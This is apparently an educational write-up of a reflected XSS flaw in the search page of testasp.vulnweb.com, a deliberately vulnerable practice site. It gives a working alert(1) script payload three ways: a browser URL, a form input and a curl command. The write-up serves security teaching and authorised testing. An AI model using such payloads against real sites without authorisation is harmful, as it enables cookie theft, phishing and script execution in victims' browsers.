# Reflected-XSS-testasp.vulnweb.com
Reflected Cross-Site Scripting (XSS) is a common web application vulnerability that occurs when user input is taken from an HTTP request and immediately reflected in the server’s response without proper validation or encoding. Attackers exploit this flaw by crafting a malicious URL that includes a JavaScript payload in a parameter.





Vulnerability summary:

Type: Reflected Cross-Site Scripting (XSS)

Location: Search.asp (user-supplied input reflected in the response without proper encoding/validation)

Attack vector: Crafted URL / POST data causes attacker-supplied script to execute in victim's browser when they open the URL.

Impact: Theft of cookies/session tokens (if HttpOnly not set), UI redressing, phishing, and arbitrary JavaScript execution in victim context.

Severity: Medium to High (depends on surrounding controls: HttpOnly, SameSite, CSP).






Responsible disclosure note:

This PoC is provided for educational / authorized security testing only. vulnweb.com is a deliberately vulnerable testing site operated by Acunetix — use responsibly. Do not test sites you do not have explicit permission to test.





Affected resource:

URL: http://testasp.vulnweb.com/Search.asp

Location: Search input field (query parameter Search reflected into response)





Proof of concept (PoC):

Browser (address bar)
http://testasp.vulnweb.com/Search.asp?Search=abc%3Cscript%3Ealert(1)%3C%2Fscript%3E

Open the URL. If reflected unencoded, an alert(1) will appear confirming reflected XSS.




Browser (form input):

1.Go to http://testasp.vulnweb.com/Search.asp.

2.Paste <script>alert(1)</script> into the site’s search bar and submit.

3.If echoed unencoded in the response, the alert triggers.

Command line (curl):
curl -v "http://testasp.vulnweb.com/Search.asp?Search=%3Cscript%3Ealert(1)%3C%2Fscript%3E"









